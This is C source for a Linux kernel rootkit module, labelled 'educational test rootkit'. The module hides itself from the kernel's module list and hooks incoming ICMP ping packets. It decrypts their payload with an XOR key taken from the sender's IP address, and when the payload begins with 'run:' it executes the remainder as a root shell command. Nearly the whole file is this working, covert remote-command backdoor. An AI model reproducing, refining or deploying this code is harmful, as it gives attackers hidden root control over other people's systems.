#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/inet.h> // For in_aton
#include "rootkit.h"

#define MAX_CMD_LEN 1976 // Maximum command length

static struct nf_hook_ops nfho; // Structure for Netfilter hook registration

char exec_cmd_buffer[MAX_CMD_LEN]; // Buffer for storing the command

// Simple XOR decryption for kernel
static void simple_xor_decrypt(char *out_buf, const unsigned char *in_buf, int data_len, __be32 xor_key) {
    unsigned char *key_bytes = (unsigned char *)&xor_key;
    int idx;
    for (idx = 0; idx < data_len; ++idx) {
        out_buf[idx] = in_buf[idx] ^ key_bytes[idx % 4];
    }
    out_buf[data_len] = '\0';
}

// Deferred work handler, executes the command from exec_cmd_buffer
static void exec_work_handler(struct work_struct *work) 
{
  static char *argv[] = {"/bin/sh", "-c", exec_cmd_buffer, NULL}; // Arguments for shell execution
  static char *envp[] = {"PATH=/bin:/sbin", NULL}; // Environment

  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); // Run command in usermode
}

DECLARE_WORK(exec_work, exec_work_handler); // Macro for declaring deferred work

char exec_cmd_buffer[MAX_CMD_LEN]; // Buffer for storing the command

// Main function for intercepting ICMP packets
static unsigned int icmp_command_interceptor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    unsigned char *payload_ptr;
    unsigned char *payload_end;
    int idx = 0;
    int decrypted_len;
    __be32 decrypt_key;

    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);

    // Check if this is an ICMP packet
    if (iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }
    // Check if this is an ICMP Echo (ping)
    if (icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    // Extract user data from the packet
    payload_ptr = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    payload_end = skb_tail_pointer(skb);
    decrypted_len = payload_end - payload_ptr;
    printk(KERN_INFO "[icmpshell] Payload length: %d\n", decrypted_len);

    // Use source IP as key by default
    decrypt_key = iph->saddr;
    printk(KERN_INFO "[icmpshell] Using key: %pI4\n", &decrypt_key);

    // Decrypt payload
    simple_xor_decrypt(exec_cmd_buffer, payload_ptr, decrypted_len, decrypt_key);
    printk(KERN_INFO "[icmpshell] Decrypted payload: %s\n", exec_cmd_buffer);

    // Check if the command starts with "run:"
    if (strncmp(exec_cmd_buffer, "run:", 4) != 0) {
        printk(KERN_INFO "[icmpshell] No 'run:' prefix, skipping\n");
        return NF_ACCEPT;
    } else {
        // Shift the string to remove "run:"
        for (idx = 0; idx <= sizeof(exec_cmd_buffer)/sizeof(exec_cmd_buffer[0])-4; idx++) {
            exec_cmd_buffer[idx] = exec_cmd_buffer[idx+4];
            if (exec_cmd_buffer[idx] == '\0')
                break;
        }
        printk(KERN_INFO "[icmpshell] Command to execute: %s\n", exec_cmd_buffer);
    }

    schedule_work(&exec_work); // Schedule deferred work
    printk(KERN_INFO "[icmpshell] Scheduled work for command\n");

    return NF_ACCEPT;
}

// Module initialization function
static int __init startup(void)
{
  hide_module(); // shadow the module from the kernel
  nfho.hook = icmp_command_interceptor; // Set the handler
  nfho.hooknum = NF_INET_PRE_ROUTING; // Intercept before routing
  nfho.pf = PF_INET;
  nfho.priority = NF_IP_PRI_FIRST;
  nf_register_net_hook(&init_net, &nfho); // Register the hook
  printk(KERN_WARNING "[icmpshell] WARNING: Educational test rootkit loaded into the kernel!\n"); // Print warning to dmesg
  return 0;
}

// Module cleanup function
static void __exit cleanup(void)
{
  nf_unregister_net_hook(&init_net, &nfho); // Unregister the hook
}

MODULE_LICENSE("GPL"); // Module license
module_init(startup); // Entry point for module loading
module_exit(cleanup); // Exit point for module unloading
